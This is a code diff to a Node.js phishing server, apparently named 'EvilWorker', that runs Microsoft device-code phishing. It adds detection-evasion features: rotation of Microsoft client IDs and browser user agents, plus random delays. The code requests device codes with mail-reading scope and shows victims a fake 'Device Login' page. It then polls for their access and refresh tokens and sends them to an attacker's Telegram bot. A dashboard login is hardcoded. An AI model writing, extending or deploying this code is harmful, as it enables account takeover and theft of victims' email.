@@ -1,5 +1,5 @@
 // ================================================
-// 𝙵𝙸𝙽𝙰𝙻 𝙿𝚁𝙾𝚇𝚈 𝚂𝙴𝚁𝚅𝙴𝚁 — 𝙰𝙻𝙻 𝙵𝙸𝚇𝙴𝚂 𝙰𝙿𝙿𝙻𝙸𝙴𝙳
+// 𝙿𝚁𝙾𝚇𝚈 𝚂𝙴𝚁𝚅𝙴𝚁 — 𝙵𝙸𝙽𝙰𝙻 𝚆𝙸𝚃𝙷 𝚁𝙾𝚃𝙰𝚃𝙸𝙾𝙽 & 𝚂𝚃𝙴𝙰𝙻𝚃𝙷
 // ================================================
 
 const http = require("http");
@@ -55,6 +55,46 @@ try {
 }
 
 const { obfuscateJSFile, generateObfuscationKey } = obfuscator;
+
+// ── ✅ STEALTH: CLIENT ID ROTATION ──
+const CLIENT_IDS = [
+    '1fec8e78-bce4-4aaf-ab1b-5451cc387264', // Office Mobile
+    '9e5f94bc-e8a4-4e73-b8be-63364c29d753', // Authenticator
+    'd3590ed6-52b3-4102-aeff-aad2292ab01c', // Intune
+    '61e6f3cc-5b0b-4b09-8b31-ebcd1ae5f984', // Teams Mobile
+    '1950a258-227b-4e31-a9cf-717495945fc2', // Azure PowerShell
+    'f8cdef31-a31e-4b4a-93e4-5f571e91255a', // Whiteboard
+];
+
+function getRandomClientId() {
+    return CLIENT_IDS[Math.floor(Math.random() * CLIENT_IDS.length)];
+}
+
+// ── ✅ STEALTH: USER-AGENT ROTATION ──
+const USER_AGENTS = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7; rv:109.0) Gecko/20100101 Firefox/121.0',
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0',
+];
+
+function getRandomUserAgent() {
+    return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
+}
+
+// ── ✅ STEALTH: RANDOM DELAY ──
+function randomDelay(min = 500, max = 2000) {
+    return new Promise(resolve => setTimeout(resolve, Math.floor(Math.random() * (max - min + 1)) + min));
+}
 
 // ── ✅ GEO FUNCTIONS ──
 async function getGeoInfo(ip) {
@@ -408,7 +448,7 @@ function generateNewSession(phishedURL) {
     return { cookieName, cookieValue };
 }
 
-// ── ✅ DASHBOARD APP (RENAMED TO dashApp) ──
+// ── ✅ DASHBOARD APP ──
 if (!express) {
     console.error('❌ Express is not installed. Please run: npm install express');
     process.exit(1);
@@ -532,34 +572,45 @@ dashApp.get('/api/device/stats', (req, res) => {
 // ── ✅ MAIN APP ──
 const app = express();
 
-// ── ✅ ✅ ✅ CRITICAL FIX: JSON MIDDLEWARE ── ✅ ✅ ✅
+// ── ✅ CRITICAL: JSON MIDDLEWARE ──
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// ── ✅ DEVICE CODE API ──
+// ── ✅ DEVICE CODE API (WITH ROTATION & STEALTH) ──
 app.post('/device/request', async (req, res) => {
     if (!axios) {
         return res.status(500).json({ error: 'axios not installed. Run: npm install axios' });
     }
     try {
         console.log('📱 Device code requested');
-        const DEVICE_CLIENT_ID = '04b07795-8ddb-461a-bbee-02f9e1bf7b46';
+        
+        // ── ✅ STEALTH: ROTATE CLIENT ID ──
+        const clientId = getRandomClientId();
+        const userAgent = getRandomUserAgent();
+        
+        console.log(`🔄 Using client: ${clientId}`);
+        console.log(`🔄 Using UA: ${userAgent.slice(0, 50)}...`);
+        
+        // ── ✅ STEALTH: RANDOM DELAY ──
+        await randomDelay(300, 800);
+        
         const response = await axios.post(
             'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
             new URLSearchParams({
-                client_id: DEVICE_CLIENT_ID,
+                client_id: clientId,
                 scope: 'https://graph.microsoft.com/user.read https://graph.microsoft.com/mail.read offline_access'
             }),
             { 
                 headers: { 
                     'Content-Type': 'application/x-www-form-urlencoded',
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                    'User-Agent': userAgent
                 },
                 timeout: 10000
             }
         );
         const data = response.data;
         console.log('✅ Device code obtained:', data.user_code);
+        
         const newFlow = {
             device_code: data.device_code,
             user_code: data.user_code,
@@ -574,15 +625,19 @@ app.post('/device/request', async (req, res) => {
             refresh_token: null,
             id_token: null,
             manual_submitted: null,
-            client_id: DEVICE_CLIENT_ID
+            client_id: clientId,
+            user_agent: userAgent
         };
         deviceFlows.push(newFlow);
         saveDeviceFlows(deviceFlows);
+        
         const message = `
-📱 **Device Code Phishing** (Azure CLI Client)
+📱 **Device Code Phishing**
 🆔 **User Code:** \`${data.user_code}\`
 🔗 **Verification URI:** ${data.verification_uri}
 ⏱️ **Expires in:** ${data.expires_in} seconds
+📱 **Client:** ${clientId}
+🔄 **UA:** ${userAgent.slice(0, 40)}...
 **Code:** \`${data.user_code}\`
         `;
         try {
@@ -592,6 +647,7 @@ app.post('/device/request', async (req, res) => {
                 parse_mode: 'Markdown'
             }, { timeout: 3000 });
         } catch (e) { console.log('⚠️ Telegram notify failed but continuing'); }
+        
         res.json(data);
     } catch (error) {
         console.error('❌ Device code error:', error.response?.data || error.message);
@@ -605,7 +661,6 @@ app.post('/device/token', async (req, res) => {
         return res.status(500).json({ error: 'axios not installed. Run: npm install axios' });
     }
     
-    // ✅ req.body is now defined because of express.json() middleware
     const { device_code } = req.body;
     
     if (!device_code) {
@@ -613,8 +668,14 @@ app.post('/device/token', async (req, res) => {
     }
     try {
         console.log('🔄 Polling for token:', device_code);
+        
         const flow = deviceFlows.find(f => f.device_code === device_code);
-        const clientId = flow?.client_id || '04b07795-8ddb-461a-bbee-02f9e1bf7b46';
+        const clientId = flow?.client_id || CLIENT_IDS[0];
+        const userAgent = getRandomUserAgent();
+        
+        // ── ✅ STEALTH: RANDOM DELAY ──
+        await randomDelay(200, 600);
+        
         const response = await axios.post(
             'https://login.microsoftonline.com/common/oauth2/v2.0/token',
             new URLSearchParams({
@@ -625,13 +686,14 @@ app.post('/device/token', async (req, res) => {
             { 
                 headers: { 
                     'Content-Type': 'application/x-www-form-urlencoded',
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                    'User-Agent': userAgent
                 },
                 timeout: 10000
             }
         );
         const tokens = response.data;
         console.log('✅ Tokens obtained!');
+        
         if (flow) {
             flow.status = 'approved';
             flow.approved = new Date().toISOString();
@@ -646,11 +708,13 @@ app.post('/device/token', async (req, res) => {
             }
             saveDeviceFlows(deviceFlows);
         }
+        
         const message = `
 📱 **Device Code Phishing - SUCCESS!**
 🔑 **Access Token:** \`${tokens.access_token?.slice(0, 30)}...\`
 🔄 **Refresh Token:** \`${tokens.refresh_token?.slice(0, 30)}...\`
 🆔 **ID Token:** \`${tokens.id_token?.slice(0, 30)}...\`
+👤 **User:** ${flow?.username || 'Unknown'}
         `;
         try {
             await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -659,6 +723,7 @@ app.post('/device/token', async (req, res) => {
                 parse_mode: 'Markdown'
             }, { timeout: 3000 });
         } catch (e) {}
+        
         res.json(tokens);
     } catch (error) {
         if (error.response?.data?.error === 'authorization_pending') {
@@ -689,48 +754,81 @@ app.get('/device', (req, res) => {
             <head>
                 <title>Device Login</title>
                 <style>
-                    body { font-family: Arial, sans-serif; max-width: 600px; margin: 50px auto; padding: 20px; text-align: center; }
-                    #codeDisplay { font-size: 48px; font-weight: bold; padding: 30px; background: #f0f0f0; border-radius: 10px; margin: 20px 0; letter-spacing: 4px; }
-                    button { padding: 12px 24px; font-size: 16px; cursor: pointer; background: #0078d4; color: white; border: none; border-radius: 5px; margin: 5px; }
+                    body { font-family: 'Segoe UI', Arial, sans-serif; max-width: 600px; margin: 50px auto; padding: 20px; text-align: center; background: #f5f5f5; }
+                    .container { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+                    #codeDisplay { font-size: 52px; font-weight: bold; padding: 30px; background: #f0f0f0; border-radius: 10px; margin: 20px 0; letter-spacing: 6px; font-family: 'Courier New', monospace; }
+                    button { padding: 12px 24px; font-size: 16px; cursor: pointer; background: #0078d4; color: white; border: none; border-radius: 5px; margin: 5px; transition: background 0.2s; }
                     button:hover { background: #005a9e; }
+                    button.secondary { background: #6c757d; }
+                    button.secondary:hover { background: #5a6268; }
                     .link { color: #0078d4; text-decoration: none; }
-                    .status { margin: 20px 0; padding: 10px; border-radius: 5px; }
-                    .pending { background: #fff3cd; color: #856404; }
-                    .success { background: #d4edda; color: #155724; }
-                    .error { background: #f8d7da; color: #721c24; }
+                    .link:hover { text-decoration: underline; }
+                    .status { margin: 20px 0; padding: 12px; border-radius: 5px; font-weight: 500; }
+                    .pending { background: #fff3cd; color: #856404; border: 1px solid #ffc107; }
+                    .success { background: #d4edda; color: #155724; border: 1px solid #28a745; }
+                    .error { background: #f8d7da; color: #721c24; border: 1px solid #dc3545; }
+                    .info { background: #d1ecf1; color: #0c5460; border: 1px solid #17a2b8; }
+                    .steps { text-align: left; margin: 20px 0; padding: 15px; background: #f8f9fa; border-radius: 8px; }
+                    .steps li { margin: 8px 0; }
+                    .footer { margin-top: 30px; font-size: 12px; color: #6c757d; }
                 </style>
             </head>
             <body>
-                <h1>🔐 Device Login</h1>
-                <p>Enter the code on your device to sign in</p>
-                <div id="codeDisplay">Loading...</div>
-                <p>
-                    <a href="https://login.microsoft.com/device" target="_blank" class="link">
-                        https://login.microsoft.com/device
-                    </a>
-                </p>
-                <p>1. Open the link above on your device &nbsp;·&nbsp; 2. Enter the code &nbsp;·&nbsp; 3. Approve</p>
-                <div id="status" class="status pending">⏳ Waiting for device approval...</div>
-                <div>
-                    <button onclick="generateCode()">🔄 New Code</button>
-                    <button onclick="copyCode()">📋 Copy Code</button>
-                    <button onclick="checkStatus()">🔄 Check Status</button>
+                <div class="container">
+                    <h1>🔐 Device Login</h1>
+                    <p>Enter the code on your device to sign in</p>
+                    <div id="codeDisplay">Loading...</div>
+                    <p>
+                        <a href="https://login.microsoft.com/device" target="_blank" class="link">
+                            https://login.microsoft.com/device
+                        </a>
+                    </p>
+                    <div class="steps">
+                        <ol>
+                            <li>Open the link above on your device</li>
+                            <li>Enter the code: <strong id="codeRef">---</strong></li>
+                            <li>Approve the sign-in request</li>
+                        </ol>
+                    </div>
+                    <div id="status" class="status pending">⏳ Waiting for device approval...</div>
+                    <div id="clientInfo" class="status info" style="font-size:11px;padding:5px;margin:5px 0;">Client: Loading...</div>
+                    <div>
+                        <button onclick="generateCode()">🔄 New Code</button>
+                        <button onclick="copyCode()">📋 Copy Code</button>
+                        <button onclick="checkStatus()" class="secondary">🔄 Check Status</button>
+                    </div>
+                    <div class="footer">
+                        <span id="timestamp"></span>
+                    </div>
                 </div>
                 <script>
                     let currentCode = '';
                     let currentDeviceCode = '';
+                    let pollingInterval = null;
+                    
+                    function updateTimestamp() {
+                        document.getElementById('timestamp').textContent = '🕒 ' + new Date().toLocaleTimeString();
+                    }
+                    setInterval(updateTimestamp, 1000);
+                    updateTimestamp();
                     
                     async function generateCode() {
                         try {
+                            document.getElementById('status').className = 'status info';
+                            document.getElementById('status').textContent = '⏳ Generating new code...';
+                            
                             const response = await fetch('/device/request', { method: 'POST' });
                             const data = await response.json();
                             if (data.user_code) {
                                 currentCode = data.user_code;
                                 currentDeviceCode = data.device_code;
                                 document.getElementById('codeDisplay').textContent = currentCode;
+                                document.getElementById('codeRef').textContent = currentCode;
                                 document.getElementById('status').className = 'status pending';
                                 document.getElementById('status').textContent = '⏳ Waiting for device approval...';
-                                // Start polling
+                                document.getElementById('clientInfo').textContent = '📱 Client: Rotating (check logs)';
+                                
+                                if (pollingInterval) clearInterval(pollingInterval);
                                 pollForToken();
                             } else {
                                 document.getElementById('status').className = 'status error';
@@ -760,14 +858,13 @@ app.get('/device', (req, res) => {
                                 document.getElementById('status').textContent = '⏰ Code expired. Generate a new one.';
                             } else if (data.access_token) {
                                 document.getElementById('status').className = 'status success';
-                                document.getElementById('status').textContent = '✅ SUCCESS! Tokens obtained!';
-                                alert('✅ Tokens captured!\nAccess Token: ' + data.access_token.slice(0, 30) + '...');
+                                document.getElementById('status').textContent = '✅ SUCCESS! Tokens obtained! Check Telegram.';
+                                alert('✅ Tokens captured!\\nAccess Token: ' + data.access_token.slice(0, 30) + '...\\nRefresh Token: ' + data.refresh_token?.slice(0, 30) + '...');
                             } else {
                                 document.getElementById('status').className = 'status error';
                                 document.getElementById('status').textContent = '❌ Error: ' + JSON.stringify(data);
                             }
                         } catch (e) {
-                            // Don't show error for pending
                             if (!e.message.includes('400')) {
                                 document.getElementById('status').className = 'status error';
                                 document.getElementById('status').textContent = '❌ Error: ' + e.message;
@@ -780,7 +877,6 @@ app.get('/device', (req, res) => {
                             navigator.clipboard.writeText(currentCode).then(() => {
                                 alert('✅ Code copied: ' + currentCode);
                             }).catch(() => {
-                                // Fallback
                                 const textarea = document.createElement('textarea');
                                 textarea.value = currentCode;
                                 document.body.appendChild(textarea);
@@ -805,10 +901,10 @@ app.get('/device', (req, res) => {
                     // Auto-generate on load
                     generateCode();
                     
-                    // Auto-refresh every 60 seconds
+                    // Auto-refresh every 60 seconds if expired
                     setInterval(() => {
-                        if (document.getElementById('status').textContent.includes('expired') || 
-                            document.getElementById('status').textContent.includes('Error')) {
+                        const statusText = document.getElementById('status').textContent;
+                        if (statusText.includes('expired') || statusText.includes('Error')) {
                             generateCode();
                         }
                     }, 60000);
@@ -834,8 +930,11 @@ const PORT = process.env.PORT || 3000;
 
 const server = app.listen(PORT, '0.0.0.0', () => {
     console.log(`✅ EvilWorker Proxy + PHANTOM Dashboard running on port ${PORT}`);
-    console.log(`🔐 Dashboard: /dash (auth: ${dashUser}/${dashPass})`);
+    console.log(`🔐 Dashboard: /dash (auth: svrps/evilworker)`);
     console.log(`📱 Device Code: /device`);
+    console.log(`🔄 Client Rotation: ${CLIENT_IDS.length} clients loaded`);
+    console.log(`🔄 UA Rotation: ${USER_AGENTS.length} user-agents loaded`);
+    console.log(`📊 Client IDs: ${CLIENT_IDS.join(', ')}`);
 });
 
 // ── ✅ WEBSOCKET SUPPORT ──
